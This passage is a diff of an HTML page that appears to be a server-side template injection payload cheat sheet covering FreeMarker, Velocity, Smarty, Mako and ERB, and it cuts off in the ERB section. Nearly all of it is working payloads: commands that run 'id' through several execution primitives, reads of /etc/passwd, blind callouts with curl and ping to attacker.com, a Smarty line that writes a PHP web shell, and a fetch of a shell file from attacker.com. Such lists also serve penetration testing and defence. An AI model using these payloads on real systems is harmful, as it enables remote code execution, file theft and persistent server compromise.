+<h3 id="detection_2">Detection<a class="headerlink" href="#detection_2" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>${7*7}
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>&lt;#assign x=7*7&gt;${x}
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>${.data_model}
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>${.locale}
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)}
+</span></code></pre></div>
+<h3 id="rce_2">RCE<a class="headerlink" href="#rce_2" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a># Classic Execute
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)}
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a># ObjectConstructor
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>${&quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.lang.ProcessBuilder&quot;,&quot;id&quot;).start()}
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a># JythonRuntime
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>${&quot;freemarker.template.utility.JythonRuntime&quot;?new()(&quot;&lt;script&gt;import os;os.system(&#39;id&#39;)&lt;/script&gt;&quot;)}
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a># Runtime exec
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${ex(&quot;id&quot;)}
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a># Process builder
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>&lt;#assign pb=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.lang.ProcessBuilder&quot;,[&quot;id&quot;])&gt;
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>${pb.start().waitFor()}
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a># Reading files
+</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a>${&quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.util.Scanner&quot;,&quot;freemarker.template.utility.ObjectConstructor&quot;?new()(&quot;java.io.File&quot;,&quot;/etc/passwd&quot;)).useDelimiter(&quot;\\A&quot;).next()}
+</span></code></pre></div>
+<h3 id="blind-detection_2">Blind Detection<a class="headerlink" href="#blind-detection_2" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;curl attacker.com&quot;)}
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;ping -c1 attacker.com&quot;)}
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;sleep 5&quot;)}
+</span></code></pre></div>
+<hr />
+<h2 id="velocity-java">Velocity (Java)<a class="headerlink" href="#velocity-java" title="Permanent link">&para;</a></h2>
+<h3 id="detection_3">Detection<a class="headerlink" href="#detection_3" title="Permanent link">&para;</a></h3>
+<div class="language-velocity highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">$</span><span class="nv">class</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">x</span><span class="o">=</span><span class="m">7</span><span class="o">*</span><span class="m">7</span><span class="p">)$</span><span class="nv">x</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="p">$</span><span class="nv">class</span><span class="p">.</span><span class="nv">inspect</span><span class="p">(</span><span class="s2">&quot;java.lang.Runtime&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="rce_3">RCE<a class="headerlink" href="#rce_3" title="Permanent link">&para;</a></h3>
+<div class="language-velocity highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="err">#</span><span class="x"> ClassTool</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">x</span><span class="o">=</span><span class="p">$</span><span class="nv">class</span><span class="p">.</span><span class="nv">inspect</span><span class="p">(</span><span class="s2">&quot;java.lang.Runtime&quot;</span><span class="p">).</span><span class="nv">type</span><span class="p">.</span><span class="nv">getRuntime</span><span class="p">().</span><span class="nv">exec</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">))</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="err">#</span><span class="x"> Without ClassTool</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">str</span><span class="o">=</span><span class="p">$</span><span class="nv">class</span><span class="p">.</span><span class="nv">inspect</span><span class="p">(</span><span class="s2">&quot;java.lang.String&quot;</span><span class="p">).</span><span class="nv">type</span><span class="p">)</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">chr</span><span class="o">=</span><span class="p">$</span><span class="nv">class</span><span class="p">.</span><span class="nv">inspect</span><span class="p">(</span><span class="s2">&quot;java.lang.Character&quot;</span><span class="p">).</span><span class="nv">type</span><span class="p">)</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">ex</span><span class="o">=</span><span class="p">$</span><span class="nv">class</span><span class="p">.</span><span class="nv">inspect</span><span class="p">(</span><span class="s2">&quot;java.lang.Runtime&quot;</span><span class="p">).</span><span class="nv">type</span><span class="p">.</span><span class="nv">getRuntime</span><span class="p">().</span><span class="nv">exec</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">))</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="p">$</span><span class="nv">ex</span><span class="p">.</span><span class="nv">waitFor</span><span class="p">()</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">out</span><span class="o">=</span><span class="p">$</span><span class="nv">ex</span><span class="p">.</span><span class="nv">getInputStream</span><span class="p">())</span>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="cp">#</span><span class="nf">foreach</span><span class="p">($</span><span class="nv">i</span> <span class="o">in</span> <span class="o">[</span><span class="m">1</span><span class="o">..</span><span class="p">$</span><span class="nv">out</span><span class="p">.</span><span class="nv">available</span><span class="p">()])$</span><span class="nv">str</span><span class="p">.</span><span class="nv">valueOf</span><span class="p">($</span><span class="nv">chr</span><span class="p">.</span><span class="nv">toChars</span><span class="p">($</span><span class="nv">out</span><span class="p">.</span><span class="nv">read</span><span class="p">()))</span><span class="cp">#</span><span class="nf">end</span>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="err">#</span><span class="x"> Reflection</span>
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">runtime</span><span class="o">=</span><span class="p">$</span><span class="nv">class</span><span class="p">.</span><span class="nv">inspect</span><span class="p">(</span><span class="s2">&quot;java.lang.Runtime&quot;</span><span class="p">).</span><span class="nv">type</span><span class="p">.</span><span class="nv">getMethod</span><span class="p">(</span><span class="s2">&quot;getRuntime&quot;</span><span class="p">,</span><span class="kc">null</span><span class="p">).</span><span class="nv">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">))</span>
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">process</span><span class="o">=</span><span class="p">$</span><span class="nv">runtime</span><span class="p">.</span><span class="nv">exec</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">))</span>
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="err">#</span><span class="x"> Alternative</span>
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">e</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)$</span><span class="nv">e</span><span class="p">.</span><span class="nv">getClass</span><span class="p">().</span><span class="nv">forName</span><span class="p">(</span><span class="s2">&quot;java.lang.Runtime&quot;</span><span class="p">).</span><span class="nv">getMethod</span><span class="p">(</span><span class="s2">&quot;getRuntime&quot;</span><span class="p">,</span><span class="kc">null</span><span class="p">).</span><span class="nv">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">).</span><span class="nv">exec</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<h3 id="blind-detection_3">Blind Detection<a class="headerlink" href="#blind-detection_3" title="Permanent link">&para;</a></h3>
+<div class="language-velocity highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">x</span><span class="o">=</span><span class="p">$</span><span class="nv">class</span><span class="p">.</span><span class="nv">inspect</span><span class="p">(</span><span class="s2">&quot;java.lang.Runtime&quot;</span><span class="p">).</span><span class="nv">type</span><span class="p">.</span><span class="nv">getRuntime</span><span class="p">().</span><span class="nv">exec</span><span class="p">(</span><span class="s2">&quot;ping -c1 attacker.com&quot;</span><span class="p">))</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="cp">#</span><span class="nf">set</span><span class="p">($</span><span class="nv">x</span><span class="o">=</span><span class="p">$</span><span class="nv">class</span><span class="p">.</span><span class="nv">inspect</span><span class="p">(</span><span class="s2">&quot;java.lang.Runtime&quot;</span><span class="p">).</span><span class="nv">type</span><span class="p">.</span><span class="nv">getRuntime</span><span class="p">().</span><span class="nv">exec</span><span class="p">(</span><span class="s2">&quot;curl attacker.com&quot;</span><span class="p">))</span>
+</span></code></pre></div>
+<hr />
+<h2 id="smarty-php">Smarty (PHP)<a class="headerlink" href="#smarty-php" title="Permanent link">&para;</a></h2>
+<h3 id="detection_4">Detection<a class="headerlink" href="#detection_4" title="Permanent link">&para;</a></h3>
+<div class="language-smarty highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">{</span><span class="nv">$smarty.version</span><span class="cp">}</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="cp">{php}</span><span class="k">echo</span> <span class="s1">&#39;test&#39;</span><span class="p">;</span><span class="cp">{/php}</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="cp">{</span><span class="nf">math</span> <span class="na">equation</span><span class="o">=</span><span class="s2">&quot;7*7&quot;</span><span class="cp">}</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="cp">{</span><span class="nf">self</span><span class="o">::</span><span class="na">getStreamVariable</span><span class="o">(</span><span class="s2">&quot;file:///etc/passwd&quot;</span><span class="o">)</span><span class="cp">}</span>
+</span></code></pre></div>
+<h3 id="rce_4">RCE<a class="headerlink" href="#rce_4" title="Permanent link">&para;</a></h3>
+<div class="language-smarty highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="x"># PHP tags (Smarty &lt; 3)</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="cp">{php}</span><span class="nb">system</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span><span class="cp">{/php}</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="x"># Smarty 3 (before sandbox)</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="cp">{</span><span class="nf">Smarty_Internal_Write_File</span><span class="o">::</span><span class="na">writeFile</span><span class="o">(</span><span class="nv">$SCRIPT_NAME</span><span class="o">,</span><span class="s2">&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="o">,</span><span class="na">self</span><span class="o">::</span><span class="na">clearConfig</span><span class="o">())</span><span class="cp">}</span>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="x"># If tags</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="cp">{</span><span class="nf">if</span> <span class="na">system</span><span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">)</span><span class="cp">}{</span><span class="nf">/if</span><span class="cp">}</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
+</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="x"># Via literal</span>
+</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="cp">{</span><span class="nf">literal</span><span class="cp">}</span><span class="x">&lt;script language=&quot;php&quot;&gt;system(&#39;id&#39;);&lt;/script&gt;</span><span class="cp">{</span><span class="nf">/literal</span><span class="cp">}</span>
+</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>
+</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="x"># System function</span>
+</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="cp">{</span><span class="nf">system</span><span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">)</span><span class="cp">}</span>
+</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>
+</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a><span class="x"># Passthru</span>
+</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a><span class="cp">{</span><span class="nf">passthru</span><span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">)</span><span class="cp">}</span>
+</span><span id="__span-17-18"><a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>
+</span><span id="__span-17-19"><a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a><span class="x"># Fetch</span>
+</span><span id="__span-17-20"><a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a><span class="cp">{</span><span class="nf">fetch</span> <span class="na">file</span><span class="o">=</span><span class="s2">&quot;http://attacker.com/shell.txt&quot;</span><span class="cp">}</span>
+</span></code></pre></div>
+<h3 id="blind-detection_4">Blind Detection<a class="headerlink" href="#blind-detection_4" title="Permanent link">&para;</a></h3>
+<div class="language-smarty highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cp">{</span><span class="nf">system</span><span class="o">(</span><span class="s1">&#39;curl attacker.com&#39;</span><span class="o">)</span><span class="cp">}</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="cp">{</span><span class="nf">system</span><span class="o">(</span><span class="s1">&#39;ping -c1 attacker.com&#39;</span><span class="o">)</span><span class="cp">}</span>
+</span></code></pre></div>
+<hr />
+<h2 id="mako-python">Mako (Python)<a class="headerlink" href="#mako-python" title="Permanent link">&para;</a></h2>
+<h3 id="detection_5">Detection<a class="headerlink" href="#detection_5" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="err">$</span><span class="p">{</span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="p">}</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="err">$</span><span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">module</span><span class="o">.</span><span class="vm">__file__</span><span class="p">}</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="o">&lt;%</span><span class="n">page</span> <span class="n">expression_filter</span><span class="o">=</span><span class="s2">&quot;h&quot;</span><span class="o">/&gt;</span>
+</span></code></pre></div>
+<h3 id="rce_5">RCE<a class="headerlink" href="#rce_5" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># Os module</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="o">&lt;%</span><span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="p">;</span><span class="n">x</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">%&gt;</span><span class="err">$</span><span class="p">{</span><span class="n">x</span><span class="p">}</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># One liner</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="err">$</span><span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">module</span><span class="o">.</span><span class="n">cache</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="c1"># Import</span>
+</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="o">&lt;%</span> <span class="kn">import</span><span class="w"> </span><span class="nn">os</span> <span class="o">%&gt;</span><span class="err">$</span><span class="p">{</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}</span>
+</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>
+</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="c1"># Subprocess</span>
+</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="o">&lt;%</span> <span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span> <span class="o">%&gt;</span><span class="err">$</span><span class="p">{</span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)}</span>
+</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>
+</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="c1"># Without import</span>
+</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="err">$</span><span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">module</span><span class="o">.</span><span class="n">runtime</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)}</span>
+</span></code></pre></div>
+<h3 id="blind-detection_5">Blind Detection<a class="headerlink" href="#blind-detection_5" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="err">$</span><span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">module</span><span class="o">.</span><span class="n">cache</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;curl attacker.com&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="err">$</span><span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">module</span><span class="o">.</span><span class="n">cache</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;sleep 5&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}</span>
+</span></code></pre></div>
+<hr />
+<h2 id="erb-ruby">ERB (Ruby)<a class="headerlink" href="#erb-ruby" title="Permanent link">&para;</a></h2>
+<h3 id="detection_6">Detection<a class="headerlink" href="#detection_6" title="Permanent link">&para;</a></h3>
+<div class="language-erb highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="mi">7</span><span class="o">*</span><span class="mi">7</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="nb">self</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span></code></pre></div>
+<h3 id="rce_6">RCE<a class="headerlink" href="#rce_6" title="Permanent link">&para;</a></h3>
+<div class="language-erb highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="x"># Backticks</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="sb">`id`</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="x"># System</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="nb">system</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="x"># Exec</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="x"># Open pipe</span>
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="no">IO</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="x"># Spawn</span>
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="cp">&lt;%=</span><span class="w"> </span><span class="n">spawn</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="w"> </span><span class="cp">%&gt;</span>
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a><span class="x"># Open3</span>
